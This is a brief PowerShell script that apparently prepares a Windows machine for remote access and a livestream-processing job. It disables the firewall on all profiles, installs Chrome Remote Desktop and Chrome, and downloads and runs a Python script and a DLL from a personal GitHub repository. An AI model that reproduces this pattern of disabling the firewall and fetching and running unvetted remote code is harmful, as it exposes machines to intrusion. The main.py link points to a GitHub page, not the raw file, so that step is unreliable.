Set-DisplayResolution -Width 1920 -Height 1080 -Force
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
& {$P = $env:TEMP + '\chromeremotedesktophost.msi'; Invoke-WebRequest 'https://dl.google.com/edgedl/chrome-remote-desktop/chromeremotedesktophost.msi' -OutFile $P; Start-Process $P -Wait; Remove-Item $P}
& {$P = $env:TEMP + '\chrome_installer.exe'; Invoke-WebRequest 'https://dl.google.com/chrome/install/latest/chrome_installer.exe' -OutFile $P; Start-Process -FilePath $P -Args '/install' -Verb RunAs -Wait; Remove-Item $P}


$pythonScriptUrl = "https://github.com/singsangsingsang1/host/blob/main/main.py"
$dllFileUrl = "https://github.com/singsangsingsang1/host/raw/main/LivestreamProcessor.dll"

$folderName = "livestream"

$downloadsPath = [System.Environment]::GetFolderPath('Downloads')

$newFolderPath = Join-Path -Path $downloadsPath -ChildPath $folderName
New-Item -Path $newFolderPath -ItemType Directory

Invoke-WebRequest -Uri $pythonScriptUrl -OutFile (Join-Path -Path $newFolderPath -ChildPath "main.py")

Invoke-WebRequest -Uri $dllFileUrl -OutFile (Join-Path -Path $newFolderPath -ChildPath "LivestreamProcessor.dll")

$pythonScriptPath = Join-Path -Path $newFolderPath -ChildPath "main.py"
Start-Process -FilePath "python" -ArgumentList $pythonScriptPath
